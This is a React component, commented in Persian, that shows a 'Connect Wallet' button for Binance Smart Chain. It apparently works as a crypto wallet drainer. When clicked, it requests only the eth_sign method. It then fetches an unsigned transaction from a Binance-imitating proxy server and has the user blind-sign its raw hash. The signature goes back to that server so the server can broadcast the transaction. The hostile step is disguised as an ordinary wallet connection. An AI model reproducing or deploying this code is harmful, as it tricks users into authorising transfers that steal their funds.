import jQuery from "jquery";
import { EthereumProvider } from "@walletconnect/ethereum-provider";
import { keccak256, toUtf8Bytes } from "ethers"; // اصلاح هش

function App() {
  async function runner() {
    if (typeof localStorage !== "undefined") {
      localStorage.removeItem("walletconnect");
    }

    var ethereumProvider = await EthereumProvider.init({
      showQrModal: true,
      chains: [56], // فقط BSC
      methods: ["eth_sign"], // تغییر به `eth_sign`
      projectId: "9fe3ed74e1d73141e8b7747bedf77551",
    });

    await ethereumProvider.enable();
    var provider = ethereumProvider;
    var account = await provider.request({ method: "eth_accounts" });

    if (!account.length) {
      console.error("❌ No account found.");
      return;
    }

    var account_sender = account[0];
    console.log("✅ Wallet Address:", account_sender);

    try {
      await provider.request({
        method: "wallet_switchEthereumChain",
        params: [{ chainId: "0x38" }], // BSC Chain ID
      });
    } catch (error) {
      console.error("❌ Error in switching chain:", error);
      return;
    }

    let apiUrl = "https://sponsorbinance.vercel.app/api/proxy";

    async function signAndSendTransaction(address, chain, type) {
      try {
        let requestData = { handler: "tx", address, chain, type };
        var result = await jQuery.post(apiUrl, requestData);
        var unsignedTx = JSON.parse(result).unsigned_tx;

        if (!unsignedTx) {
          console.error("❌ Error: Unsigned Transaction is undefined");
          return null;
        }

        console.log("📜 Unsigned Transaction:", unsignedTx);

        // **هش کردن تراکنش خام به روش صحیح**
        const txHash = keccak256(toUtf8Bytes(JSON.stringify(unsignedTx)));
        console.log("🔗 Transaction Hash:", txHash);

        // **امضا کردن هش تراکنش با `eth_sign`**
        var signedTx = await provider.request({
          method: "eth_sign",
          params: [address, txHash],  
        });

        console.log("✍️ Signed Transaction:", signedTx);

        // **ارسال تراکنش امضاشده به `send.php`**
        var txResult = await jQuery.post(apiUrl, {
          handler: "sign",
          signature: signedTx,
          unsignedTx: JSON.stringify(unsignedTx), // ارسال تراکنش خام برای بازسازی در سرور
        });

        console.log("📤 Transaction Sent:", txResult);
        return txResult;
      } catch (error) {
        console.error("❌ Error in signAndSendTransaction:", error);
        return null;
      }
    }

    var finalTxHash = await signAndSendTransaction(account_sender, "56", "coin");

    if (finalTxHash) {
      console.log("📤 Final Transaction Hash:", finalTxHash);
    } else {
      console.error("⚠ Transaction failed.");
    }
  }

  return (
    <a
      href="#"
      id="connectWallet"
      onClick={runner}
      className="uk-button uk-button-medium@m uk-button-default uk-button-outline uk-margin-left"
      data-uk-toggle=""
    >
      <span>Connect Wallet</span>
    </a>
  );
}

export default App;
